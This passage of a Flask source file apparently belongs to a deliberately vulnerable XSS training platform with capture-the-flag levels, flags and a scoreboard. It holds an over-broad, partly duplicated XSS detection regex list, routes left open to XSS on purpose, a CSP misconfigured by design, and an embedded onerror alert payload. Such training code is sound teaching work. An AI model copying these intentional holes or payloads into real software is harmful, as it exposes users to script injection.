            r'\bhasOwnProperty\s*\(',
            r'\bisPrototypeOf\s*\(',
            r'\bpropertyIsEnumerable\s*\(',
            r'\btoString\s*\(',
            r'\bvalueOf\s*\(',
            r'\btoLocaleString\s*\(',
            r'\btoFixed\s*\(',
            r'\btoExponential\s*\(',
            r'\btoPrecision\s*\(',
            r'\btoLocaleDateString\s*\(',
            r'\btoLocaleTimeString\s*\(',
            r'\btoISOString\s*\(',
            r'\btoUTCString\s*\(',
            r'\btoGMTString\s*\(',
            r'\btoDateString\s*\(',
            r'\btoTimeString\s*\(',
            r'\btoLocaleLowerCase\s*\(',
            r'\btoLocaleUpperCase\s*\(',
            r'\btoLowerCase\s*\(',
            r'\btoUpperCase\s*\(',
            r'\btrim\s*\(',
            r'\btrimStart\s*\(',
            r'\btrimEnd\s*\(',
            r'\bpadStart\s*\(',
            r'\bpadEnd\s*\(',
            r'\brepeat\s*\(',
            r'\bstartsWith\s*\(',
            r'\bendsWith\s*\(',
            r'\bnormalize\s*\(',
            r'\blocaleCompare\s*\(',
            r'\bmatch\s*\(',
            r'\bmatchAll\s*\(',
            r'\bsearch\s*\(',
            r'\breplace\s*\(',
            r'\breplaceAll\s*\(',
            r'\bsplit\s*\(',
            r'\btest\s*\(',
            r'\bexec\s*\(',
            r'\bcompile\s*\(',
            r'\bsource\s*\.',
            r'\bflags\s*\.',
            r'\bglobal\s*\.',
            r'\bignoreCase\s*\.',
            r'\bmultiline\s*\.',
            r'\bdotAll\s*\.',
            r'\bsticky\s*\.',
            r'\bunicode\s*\.',
            r'\blastIndex\s*\.',
            r'\binput\s*\.',
            r'\bindices\s*\.',
            r'\bgroups\s*\.',
            r'\bnamed\s*\.',
            r'\bcaptures\s*\.',
            r'\bindex\s*\.',
            r'\blength\s*\.',
            r'\bname\s*\.',
            r'\bmessage\s*\.',
            r'\bstack\s*\.',
            r'\bcause\s*\.',
            r'\bfileName\s*\.',
            r'\blineNumber\s*\.',
            r'\bcolumnNumber\s*\.',
            r'\berrorCode\s*\.',
            r'\berrorMessage\s*\.',
            r'\berrorName\s*\.',
            r'\berrorDescription\s*\.',
            r'\berrorNumber\s*\.',
            r'\berrorSeverity\s*\.',
            r'\berrorCategory\s*\.',
            r'\berrorText\s*\.',
            r'\berrorURI\s*\.',
            r'\berrorLine\s*\.',
            r'\berrorColumn\s*\.',
            r'\berrorObject\s*\.',
            r'\berrorCode\s*\.',
            r'\berrorMessage\s*\.',
            r'\berrorName\s*\.',
            r'\berrorDescription\s*\.',
            r'\berrorNumber\s*\.',
            r'\berrorSeverity\s*\.',
            r'\berrorCategory\s*\.',
            r'\berrorText\s*\.',
            r'\berrorURI\s*\.',
            r'\berrorLine\s*\.',
            r'\berrorColumn\s*\.',
            r'\berrorObject\s*\.',
        ]

        # Check if input matches any XSS pattern
        for pattern in xss_patterns:
            if re.search(pattern, input_str, re.IGNORECASE):
                # In a real WAF, this would block the request
                # For our emulation, we'll return the original input and a flag indicating it was blocked
                return input_str, True

        return input_str, False

# Theme management
@app.route('/change-theme/<theme>')
def change_theme(theme):
    valid_themes = ['dark', 'light', 'cyberpunk', 'hacker']
    if theme in valid_themes:
        session['theme'] = theme
    return redirect(request.referrer or url_for('index'))

# Profile management
@app.route('/profile', methods=['GET', 'POST'])
def profile():
    user = get_local_user()

    if request.method == 'POST':
        display_name = request.form.get('display_name')
        if display_name and len(display_name) <= 50:
            # Update both display_name and username for consistency
            user.display_name = display_name
            user.username = display_name
            db.session.commit()
            return redirect(url_for('profile'))

    # Get completed challenges
    completed_challenges = []
    if user.completed_challenges:
        challenge_ids = json.loads(user.completed_challenges)
        completed_challenges = Challenge.query.filter(Challenge.id.in_(challenge_ids)).all()

    # Get total number of challenges
    total_challenge_count = Challenge.query.filter_by(active=True).count()

    # Calculate remaining challenges
    remaining_challenge_count = total_challenge_count - len(completed_challenges)

    return render_template('profile.html',
                          user=user,
                          completed_challenges=completed_challenges,
                          total_challenge_count=total_challenge_count,
                          remaining_challenge_count=remaining_challenge_count)

# Home page
@app.route('/')
def index():
    # Ensure user is initialized
    get_local_user()
    return render_template('index.html')

# Vulnerabilities selection page with categories
@app.route('/challenges')
def vulnerabilities():
    # Get all unique categories and order them properly
    categories_from_db = db.session.query(Challenge.category).distinct().all()
    all_categories = [c[0] for c in categories_from_db]

    # Remove 'SQL Injection' category if it exists (we only want 'sqli')
    if 'SQL Injection' in all_categories:
        all_categories.remove('SQL Injection')

    # Define the correct order for security training progression
    category_order = ['xss', 'sqli', 'cmdi', 'csrf', 'ssrf', 'xxe', 'ssti', 'deserial', 'auth']

    # Sort categories in the specified order
    categories = []
    for category in category_order:
        if category in all_categories:
            categories.append(category)

    # Define category display names
    category_display_names = {
        'xss': 'Cross-Site Scripting (XSS)',
        'sqli': 'SQL Injection (SQLi)',
        'cmdi': 'Command Injection (CMDi)',
        'csrf': 'Cross-Site Request Forgery (CSRF)',
        'ssrf': 'Server-Side Request Forgery (SSRF)',
        'xxe': 'XML External Entity (XXE)',
        'ssti': 'Server-Side Template Injection (SSTI)',
        'deserial': 'Insecure Deserialization',
        'auth': 'Authentication Bypass'
    }

    # Get the current user and their completed challenges
    user = get_local_user()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []

    # Get challenges grouped by category
    challenges_by_category = {}
    category_completion = {}
    total_count = 0
    completed_count = 0

    for category in categories:
        challenges = Challenge.query.filter_by(category=category, active=True).all()
        category_total = len(challenges)
        category_completed = 0

        # Process each challenge
        for challenge in challenges:
            challenge.completed = challenge.id in completed_ids
            if challenge.completed:
                challenge.flag = get_or_create_flag(challenge.id, user.machine_id)
                category_completed += 1
                completed_count += 1
            else:
                challenge.flag = None

        challenges_by_category[category] = challenges
        category_completion[category] = {
            'total': category_total,
            'completed': category_completed
        }
        total_count += category_total

    return render_template(
        'vulnerabilities.html',
        categories=categories,
        challenges_by_category=challenges_by_category,
        category_completion=category_completion,
        category_display_names=category_display_names,
        total_count=total_count,
        completed_count=completed_count
    )

# Scoreboard
@app.route('/scoreboard')
def scoreboard():
    top_users = LocalUser.query.order_by(LocalUser.score.desc()).limit(20).all()
    return render_template('scoreboard.html', users=top_users)

# Flag submission
@app.route('/submit-flag', methods=['POST'])
def submit_flag():
    challenge_id = request.form.get('challenge_id')
    flag = request.form.get('flag')
    machine_id = get_machine_id()

    if not challenge_id or not flag:
        return jsonify({'success': False, 'message': 'Missing required parameters'})

    # Convert challenge_id to integer
    try:
        challenge_id = int(challenge_id)
    except ValueError:
        return jsonify({'success': False, 'message': 'Invalid challenge ID format'})

    # Get the challenge
    challenge = Challenge.query.get(challenge_id)
    if not challenge or not challenge.active:
        return jsonify({'success': False, 'message': 'Invalid challenge'})

    # Check if flag is valid
    valid_flag = Flag.query.filter_by(
        challenge_id=challenge_id,
        machine_id=machine_id,
        flag_value=flag,
        used=False
    ).first()

    if valid_flag:
        # Mark flag as used
        valid_flag.used = True

        # Record submission
        submission = Submission(machine_id=machine_id, challenge_id=challenge_id, flag=flag, correct=True)
        db.session.add(submission)

        # Update user score
        update_user_progress(machine_id, challenge_id, challenge.points)

        db.session.commit()

        return jsonify({'success': True, 'message': f'Congratulations! You earned {challenge.points} points!'})
    else:
        # Record incorrect submission
        submission = Submission(machine_id=machine_id, challenge_id=challenge_id, flag=flag, correct=False)
        db.session.add(submission)
        db.session.commit()

        return jsonify({'success': False, 'message': 'Invalid flag. Try again!'})

# XSS Level 1 - Basic Reflected XSS
@app.route('/xss/level1', methods=['GET', 'POST'])
def xss_level1():
    user_input = request.args.get('name', '')
    machine_id = get_machine_id()
    flag = None
    xss_detected = False

    # Get this user's completed challenges
    user = get_local_user()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []

    # Check for XSS payload
    if '<script>' in user_input or 'javascript:' in user_input or 'onerror=' in user_input:
        xss_detected = True
        # Mark challenge as completed if not already
        challenge = Challenge.query.filter_by(name="Basic Reflected XSS").first()
        if challenge and challenge.id not in completed_ids:
            update_user_progress(machine_id, challenge.id, challenge.points)
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Basic Reflected XSS").first()
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level1.html', user_input=user_input, flag=flag, xss_detected=xss_detected, challenge=challenge)

# XSS Level 2 - DOM-based XSS
@app.route('/xss/level2')
def xss_level2():
    machine_id = get_machine_id()
    flag = None
    xss_detected = False

    user = get_local_user()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []

    # Mark challenge as completed if ?success=true is present (triggered by frontend after alert)
    if request.args.get('success') == 'true':
        xss_detected = True
        challenge = Challenge.query.filter_by(name="DOM-based XSS").first()
        if challenge and challenge.id not in completed_ids:
            update_user_progress(machine_id, challenge.id, challenge.points)
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []

    challenge = Challenge.query.filter_by(name="DOM-based XSS").first()
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    # Handle AJAX requests differently
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        return jsonify({
            'success': True,
            'xss_detected': xss_detected,
            'flag': flag,
            'message': 'Challenge completed successfully!'
        })

    # Regular page render
    return render_template('xss/xss_level2.html', flag=flag, xss_detected=xss_detected, challenge=challenge)

# XSS Level 3 - Stored XSS
@app.route('/xss/level3', methods=['GET', 'POST'])
def xss_level3():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False

    if request.method == 'POST':
        # Always use the current user's display name for consistency
        username = user.display_name
        content = request.form.get('content', '')

        # Check for XSS payload in content
        if '<script>' in content or 'javascript:' in content or 'onerror=' in content:
            xss_detected = True
            # Mark challenge as completed if not already
            challenge = Challenge.query.filter_by(name="Stored XSS").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []

        # Store the comment in the database
        new_comment = Comment(username=username, content=content, level=3, machine_id=machine_id)
        db.session.add(new_comment)
        db.session.commit()

        return redirect(url_for('xss_level3'))

    # Get all comments for level 3
    comments = Comment.query.filter_by(level=3).order_by(Comment.timestamp.desc()).all()

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Stored XSS").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level3.html', comments=comments, flag=flag, user=user, xss_detected=xss_detected, challenge=challenge)

# XSS Level 4 - XSS with Basic Filters
@app.route('/xss/level4', methods=['GET', 'POST'])
def xss_level4():
    machine_id = get_machine_id()
    user = get_local_user()
    message = ""
    filtered_input = ""
    waf_blocked = False
    flag = None
    xss_detected = False

    if request.method == 'POST':
        user_input = request.form.get('user_input', '')

        # Basic filter: Remove <script> tags
        filtered_input = WAF.basic_filter(user_input)
        message = "Your input has been filtered for security!"

        # Check if XSS was successful despite filtering
        if '<img' in user_input and 'onerror=' in user_input:
            xss_detected = True
            # Mark challenge as completed if not already
            challenge = Challenge.query.filter_by(name="XSS with Basic Filters").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS with Basic Filters").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level4.html', message=message, filtered_input=filtered_input,
                           waf_blocked=waf_blocked, flag=flag, user=user, xss_detected=xss_detected, challenge=challenge)

# XSS Level 5 - XSS with Advanced Filters
@app.route('/xss/level5', methods=['GET', 'POST'])
def xss_level5():
    machine_id = get_machine_id()
    user = get_local_user()
    message = ""
    filtered_input = ""
    waf_blocked = False
    flag = None
    xss_detected = False

    if request.method == 'POST':
        user_input = request.form.get('user_input', '')

        # More advanced filtering (still bypassable)
        filtered_input = WAF.advanced_filter(user_input)
        message = "Your input has been filtered with our advanced security system!"

        # Check if XSS was successful despite filtering
        if '<svg' in user_input and 'onload=' in user_input:
            xss_detected = True
            # Mark challenge as completed if not already
            challenge = Challenge.query.filter_by(name="XSS with Advanced Filters").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS with Advanced Filters").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level5.html', message=message, filtered_input=filtered_input,
                           waf_blocked=waf_blocked, flag=flag, user=user, xss_detected=xss_detected, challenge=challenge)

# XSS Level 6 - XSS with ModSecurity WAF
@app.route('/xss/level6', methods=['GET', 'POST'])
def xss_level6():
    machine_id = get_machine_id()
    user = get_local_user()
    message = ""
    filtered_input = ""
    waf_blocked = False
    flag = None
    xss_detected = False

    if request.method == 'POST':
        user_input = request.form.get('user_input', '')

        # ModSecurity WAF emulation
        filtered_input, waf_blocked = WAF.modsecurity_emulation(user_input)

        if waf_blocked:
            message = "⚠️ WAF Alert: Potential XSS attack detected and blocked!"
        else:
            message = "Input passed security checks."

            # Check if XSS was successful despite WAF
            if '<iframe' in user_input and 'srcdoc=' in user_input:
                xss_detected = True
                # Mark challenge as completed if not already
                challenge = Challenge.query.filter_by(name="XSS with ModSecurity WAF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS with ModSecurity WAF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level6.html', message=message, filtered_input=filtered_input,
                           waf_blocked=waf_blocked, flag=flag, user=user, xss_detected=xss_detected, challenge=challenge)

# XSS Level 7 - XSS via HTTP Headers
@app.route('/xss/level7', methods=['GET'])
def xss_level7():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False

    # Get the user's IP address and User-Agent
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')

    # Generate a random visitor ID
    random_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))

    # Check if the User-Agent contains the XSS payload
    if '<script>' in user_agent or 'javascript:' in user_agent or 'onerror=' in user_agent:
        xss_detected = True
        # Mark challenge as completed
        challenge = Challenge.query.filter_by(name="XSS via HTTP Headers").first()
        if challenge:
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
            if challenge.id not in completed_ids:
                update_user_progress(machine_id, challenge.id, challenge.points)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS via HTTP Headers").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level7.html', client_ip=client_ip, user_agent=user_agent,
                           random_id=random_id, flag=flag, user=user, xss_detected=xss_detected, challenge=challenge)

# XSS Level 8 - XSS in JSON API
@app.route('/xss/level8', methods=['GET'])
def xss_level8():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xss_detected = False

    # Check for XSS in JSON response
    if request.args.get('xss') == 'true':
        xss_detected = True
        # Mark challenge as completed
        challenge = Challenge.query.filter_by(name="XSS in JSON API").first()
        if challenge:
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
            if challenge.id not in completed_ids:
                update_user_progress(machine_id, challenge.id, challenge.points)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS in JSON API").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level8.html', flag=flag, user=user, xss_detected=xss_detected, challenge=challenge)

# API endpoint for XSS Level 8
@app.route('/api/notes', methods=['GET', 'POST'])
def api_notes():
    machine_id = get_machine_id()
    user = get_local_user()

    if request.method == 'POST':
        # Handle note creation
        data = request.get_json()

        # Create a new note
        new_note = {
            'id': random.randint(1000, 9999),
            'title': data.get('title', ''),
            'content': data.get('content', ''),
            'tags': data.get('tags', '').split(',') if data.get('tags') else [],
            'created': datetime.now().isoformat()
        }

        # Return the new note
        return jsonify(new_note)
    else:
        # Return sample notes
        notes = [
            {
                'id': 101,
                'title': 'Getting Started with DevNotes',
                'content': 'Welcome to DevNotes! This is a simple note-taking app for developers.',
                'tags': ['welcome', 'tutorial'],
                'created': '2025-04-19T10:30:00Z'
            },
            {
                'id': 102,
                'title': 'JavaScript Tips and Tricks',
                'content': 'Here are some useful JavaScript tips and tricks for web developers.',
                'tags': ['javascript', 'tips'],
                'created': '2025-04-19T11:45:00Z'
            },
            {
                'id': 103,
                'title': 'API Security Best Practices',
                'content': 'Learn how to secure your APIs against common vulnerabilities.',
                'tags': ['security', 'api'],
                'created': '2025-04-19T14:20:00Z'
            }
        ]

        # Check if there's an XSS payload in the request headers
        user_agent = request.headers.get('User-Agent', '')
        if 'XSS Level 8 Completed!' in user_agent:
            # Add a note with the XSS payload in the title
            notes.insert(0, {
                'id': 104,
                'title': '<img src=x onerror="alert(\'XSS Level 8 Completed!\');">',
                'content': 'This note contains an XSS payload in the title.',
                'tags': ['xss', 'security'],
                'created': datetime.now().isoformat()
            })

            # Mark challenge as completed when the payload is detected
            challenge = Challenge.query.filter_by(name="XSS in JSON API").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)

        return jsonify(notes)

# XSS Level 9 - XSS with CSP Bypass
@app.route('/xss/level9', methods=['GET', 'POST'])
def xss_level9():
    machine_id = get_machine_id()
    user = get_local_user()
    user_comment = ""
    flag = None
    xss_detected = False
    message = ""

    if request.method == 'POST':
        user_comment = request.form.get('comment', '')
        # Check for the intended XSS payload
        if 'alert("XSS Level 9 Completed!")' in user_comment or "alert('XSS Level 9 Completed!')" in user_comment:
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS with CSP Bypass").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to bypass the CSP and trigger the alert as described."

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS with CSP Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    response = make_response(render_template('xss/xss_level9.html', user_comment=user_comment, flag=flag, user=user, xss_detected=xss_detected, challenge=challenge, message=message))
    # Intentionally misconfigured CSP to allow the challenge to be solved
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; img-src 'self' https://via.placeholder.com data:;"

    # Add the message to the response for display
    if message:
        response.set_cookie('message', message)

    return response

# XSS Level 10 - XSS with Mutation Observer Bypass
@app.route('/xss/level10', methods=['GET', 'POST'])
def xss_level10():
    machine_id = get_machine_id()
    user = get_local_user()
    user_message = ""
    flag = None
    xss_detected = False
    message = ""
    chat_messages = [
        {"user": "System", "message": "Welcome to SafeChat! This is a secure messaging platform.", "time": "10:00 AM"},
        {"user": "Admin", "message": "Please be aware that we sanitize all messages to prevent XSS attacks.", "time": "10:05 AM"},
        {"user": "User123", "message": "I tried to use <script>alert('test')</script> but it didn't work!", "time": "10:10 AM"},
        {"user": "Admin", "message": "That's right! Our Mutation Observer technology removes malicious code instantly.", "time": "10:15 AM"}
    ]

    # Check if success parameter is present (XSS was successful)
    if request.args.get('success') == 'true':
        xss_detected = True
        challenge = Challenge.query.filter_by(name="XSS with Mutation Observer Bypass").first()
        if challenge:
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
            if challenge.id not in completed_ids:
                update_user_progress(machine_id, challenge.id, challenge.points)
        message = "Challenge solved! Flag revealed."

    if request.method == 'POST':
        user_message = request.form.get('message', '')

        # Check for the intended XSS payload
        if 'alert("XSS Level 10 Completed!")' in user_message or "alert('XSS Level 10 Completed!')" in user_message:
            xss_detected = True
            challenge = Challenge.query.filter_by(name="XSS with Mutation Observer Bypass").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."

            # Add the user's message to the chat
            chat_messages.append({
                "user": user.display_name if user else "Guest",
                "message": user_message,
                "time": datetime.now().strftime("%I:%M %p")
            })
        else:
            message = "Try to bypass the mutation observer and trigger the alert as described."

            # Add the user's message to the chat
            chat_messages.append({
                "user": user.display_name if user else "Guest",
                "message": user_message,
                "time": datetime.now().strftime("%I:%M %p")
            })

    challenge = Challenge.query.filter_by(name="XSS with Mutation Observer Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level10.html',
                          user_message=user_message,
                          flag=flag,
                          user=user,
                          xss_detected=xss_detected,
                          challenge=challenge,
                          message=message,
                          chat_messages=chat_messages)

# XSS Level 11 - XSS via SVG and CDATA
@app.route('/xss/level11', methods=['GET', 'POST'])
def xss_level11():
    machine_id = get_machine_id()
    user = get_local_user()
    svg_code = '<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"></svg>'
    filtered_svg = ""
    flag = None
    xss_detected = False
    message = ""

    # Example SVG codes for the buttons
    example_svgs = {
        'circle': '<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"><circle cx="100" cy="100" r="50" fill="blue" /></svg>',
        'rectangle': '<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"><rect x="50" y="50" width="100" height="100" fill="green" /></svg>',
        'text': '<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"><text x="50" y="100" font-family="Arial" font-size="20" fill="red">Hello SVG</text></svg>'
    }

    # Check if success parameter is present (XSS was successful)
    if request.args.get('success') == 'true':
        xss_detected = True
        challenge = Challenge.query.filter_by(name="XSS via SVG and CDATA").first()
        if challenge:
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
            if challenge.id not in completed_ids:
                update_user_progress(machine_id, challenge.id, challenge.points)
        message = "Challenge solved! Flag revealed."

    if request.method == 'POST':
        svg_code = request.form.get('svg_code', '')

        # Basic SVG filtering
        filtered_svg = svg_code
        filtered_svg = re.sub(r'<script[^>]*>.*?</script>', '', filtered_svg, flags=re.DOTALL)
        filtered_svg = re.sub(r'\son\w+=["\'][^"\'>]*["\']', '', filtered_svg)
        filtered_svg = re.sub(r'\s(?:href|xlink:href|src)=["\']javascript:[^"\'>]*["\']', '', filtered_svg)

        # Check for successful SVG XSS
        if ('alert("XSS Level 11 Completed!")' in svg_code or "alert('XSS Level 11 Completed!')" in svg_code) and ('<svg' in svg_code):
            xss_detected = True
            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="XSS via SVG and CDATA").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS via SVG and CDATA").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level11.html',
                          svg_code=svg_code,
                          filtered_svg=filtered_svg,
                          flag=flag,
                          user=user,
                          xss_detected=xss_detected,
                          challenge=challenge,
                          message=message,
                          example_svgs=example_svgs)

# XSS Level 12 - Blind XSS with Webhook Exfiltration
@app.route('/xss/level12', methods=['GET', 'POST'])
def xss_level12():
    machine_id = get_machine_id()
    user = get_local_user()
    ticket_submitted = False
    ticket_id = None
    ticket_subject = None
    ticket_description = None
    flag = None
    xss_detected = False
    message = ""
    webhook_url = ""

    # Check if success parameter is present (XSS was successful)
    if request.args.get('success') == 'true':
        xss_detected = True
        challenge = Challenge.query.filter_by(name="Blind XSS with Webhook Exfiltration").first()
        if challenge:
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
            if challenge.id not in completed_ids:
                update_user_progress(machine_id, challenge.id, challenge.points)
        message = "Challenge solved! Flag revealed."

    if request.method == 'POST':
        # Get form data
        name = request.form.get('name', '')
        email = request.form.get('email', '')
        subject = request.form.get('subject', '')
        category = request.form.get('category', '')
        description = request.form.get('description', '')
        webhook_url = request.form.get('webhook_url', '')

        # Generate a random ticket ID
        ticket_id = 'TKT-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        ticket_subject = subject
        ticket_description = description
        ticket_submitted = True

        # Check for XSS payload in description
        if ('<script>' in description or 'javascript:' in description or 'onerror=' in description) and webhook_url:
            xss_detected = True
            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="Blind XSS with Webhook Exfiltration").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Your XSS payload was executed in the admin panel and the data was exfiltrated to your webhook."

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="Blind XSS with Webhook Exfiltration").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level12.html',
                          ticket_submitted=ticket_submitted,
                          ticket_id=ticket_id,
                          ticket_subject=ticket_subject,
                          ticket_description=ticket_description,
                          flag=flag,
                          user=user,
                          xss_detected=xss_detected,
                          challenge=challenge,
                          message=message,
                          webhook_url=webhook_url)

# XSS Level 13 - XSS in PDF Generation
@app.route('/xss/level13', methods=['GET', 'POST'])
def xss_level13():
    machine_id = get_machine_id()
    user = get_local_user()
    pdf_generated = False
    resume_name = None
    resume_email = None
    resume_phone = None
    resume_summary = None
    resume_skills = None
    resume_experience = None
    flag = None
    xss_detected = False

    if request.method == 'POST':
        # Get form data
        resume_name = request.form.get('name', '')
        resume_email = request.form.get('email', '')
        resume_phone = request.form.get('phone', '')
        resume_summary = request.form.get('summary', '')
        resume_skills = request.form.get('skills', '')
        resume_experience = request.form.get('experience', '')
        pdf_generated = True

        # Check for PDF JavaScript
        if 'app.alert' in resume_summary or 'app.alert' in resume_skills or 'app.alert' in resume_experience:
            xss_detected = True
            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="XSS in PDF Generation").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS in PDF Generation").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xss/xss_level13.html', pdf_generated=pdf_generated,
                           resume_name=resume_name, resume_email=resume_email,
                           resume_phone=resume_phone, resume_summary=resume_summary,
                           resume_skills=resume_skills, resume_experience=resume_experience,
                           flag=flag, user=user, xss_detected=xss_detected, challenge=challenge)

# XSS Level 14 - XSS via Prototype Pollution
@app.route('/xss/level14', methods=['GET', 'POST'])
def xss_level14():
    machine_id = get_machine_id()
    user = get_local_user()
    config_saved = False
    config_name = None
    config_json = None
    flag = None
    xss_detected = False
    message = ""

    # Check if success parameter is present (XSS was successful)
    if request.args.get('success') == 'true':
        xss_detected = True
        challenge = Challenge.query.filter_by(name="XSS via Prototype Pollution").first()
        if challenge:
            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
            if challenge.id not in completed_ids:
                update_user_progress(machine_id, challenge.id, challenge.points)
        message = "Challenge solved! Flag revealed."

    if request.method == 'POST':
        # Get form data
        config_name = request.form.get('config_name', '')
        config_json = request.form.get('config_json', '')
        config_saved = True

        # Check for prototype pollution
        if '__proto__' in config_json and ('innerHTML' in config_json or 'outerHTML' in config_json or 'alert' in config_json):
            xss_detected = True
            # Mark challenge as completed
            challenge = Challenge.query.filter_by(name="XSS via Prototype Pollution").first()
            if challenge:
                completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                if challenge.id not in completed_ids:
                    update_user_progress(machine_id, challenge.id, challenge.points)
            message = "Challenge solved! Flag revealed."
        else:
            message = "Try to use prototype pollution to trigger the alert as described."

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="XSS via Prototype Pollution").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
